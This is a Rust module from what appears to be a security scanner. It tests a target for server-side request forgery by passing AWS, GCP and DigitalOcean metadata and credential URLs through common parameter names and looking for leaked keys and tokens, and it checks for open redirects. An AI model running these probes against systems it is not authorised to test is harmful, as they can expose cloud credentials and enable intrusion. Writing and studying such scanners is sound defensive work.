//! SSRF Advanced Engine — differential metadata probes and open-redirect confirmation.
//! MITRE: T1090 (Proxy).

use crate::engine_probes::{
    empty_ok, finding_with_probe_depth, header_value, http_client, http_get, normalize_url,
};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};

const SSRF_PROBE_DEPTH: &str = "ssrf_fetch_surface";

fn ssrf_finding(
    title: &str,
    severity: &str,
    description: &str,
    target: &str,
    extra: Value,
) -> Value {
    let mut f = finding_with_probe_depth(
        "ssrf_advanced",
        title,
        severity,
        "T1090",
        description,
        target,
        SSRF_PROBE_DEPTH,
    );
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

const METADATA_CANARIES: &[(&str, &[&str])] = &[
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        &["AccessKeyId", "SecretAccessKey", "Token", "ami-id", "instance-id"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        &["access_token", "computeMetadata", "serviceAccounts"],
    ),
    (
        "http://169.254.169.254/metadata/v1/",
        &["droplet", "region", "interfaces"],
    ),
];

fn metadata_hit(body: &str, canaries: &[&str]) -> bool {
    canaries.iter().any(|c| body.contains(c))
}

pub async fn run_ssrf_advanced_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    let baseline = http_get(&client, &base).await;
    let baseline_body_len = baseline.as_ref().map(|p| p.body.len()).unwrap_or(0);
    let baseline_status = baseline.as_ref().map(|p| p.status).unwrap_or(0);

    let ssrf_params = [
        "url",
        "webhook",
        "redirect",
        "callback",
        "fetch",
        "endpoint",
        "uri",
        "target",
        "src",
        "source",
        "dest",
        "destination",
        "load",
        "link",
        "path",
        "proxy",
    ];

    'outer: for param in &ssrf_params {
        for (meta_url, canaries) in METADATA_CANARIES {
            let probe_url = format!(
                "{}/?{}={}",
                base.trim_end_matches('/'),
                param,
                urlencoding::encode(meta_url)
            );
            if let Some(p) = http_get(&client, &probe_url).await {
                if metadata_hit(&p.body, canaries) {
                    findings.push(ssrf_finding(
                        "SSRF: cloud metadata content in response",
                        "critical",
                        &format!(
                            "Parameter '{}' at {} returned cloud metadata canaries after fetching {} (HTTP {}). Credential theft is likely.",
                            param, base, meta_url, p.status
                        ),
                        target,
                        json!({ "parameter": param, "probe_url": probe_url, "metadata_url": meta_url }),
                    ));
                    break 'outer;
                }
                let body_delta = (p.body.len() as i64 - baseline_body_len as i64).abs();
                if p.status >= 200
                    && p.status < 300
                    && body_delta > 64
                    && !p.body.contains(meta_url)
                    && baseline_status != p.status
                {
                    findings.push(ssrf_finding(
                        "SSRF: differential response to metadata URL",
                        "high",
                        &format!(
                            "Parameter '{}' changed response vs baseline (HTTP {} → {}, body Δ{} B) when passed {}. Manual OAST verification recommended.",
                            param, baseline_status, p.status, body_delta, meta_url
                        ),
                        target,
                        json!({ "parameter": param, "probe_url": probe_url }),
                    ));
                    break 'outer;
                }
            }
        }
    }

    let redirect_params = [
        "url",
        "next",
        "return",
        "returnUrl",
        "return_url",
        "redirect",
        "redir",
        "goto",
        "forward",
    ];
    let redirect_target = "https://example.com/ssrf-open-redirect-test";
    for param in &redirect_params {
        let probe_url = format!(
            "{}/?{}={}",
            base.trim_end_matches('/'),
            param,
            urlencoding::encode(redirect_target)
        );
        if let Some(p) = http_get(&client, &probe_url).await {
            if matches!(p.status, 301 | 302 | 307 | 308) {
                if let Some(loc) = header_value(&p.headers, "location") {
                    if loc.contains("example.com") {
                        findings.push(ssrf_finding(
                            "Open redirect confirmed via Location header",
                            "high",
                            &format!(
                                "{} via parameter '{}' returned {} Location: {} — enables phishing and SSRF chaining.",
                                probe_url, param, p.status, loc
                            ),
                            target,
                            json!({ "parameter": param, "location": loc }),
                        ));
                    }
                }
            }
        }
    }

    if findings.is_empty() {
        empty_ok("ssrf_advanced", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("ssrf_advanced: {} live finding(s)", n))
    }
}

pub async fn run_ssrf_advanced(target: &str) {
    print_result(run_ssrf_advanced_result(target).await);
}
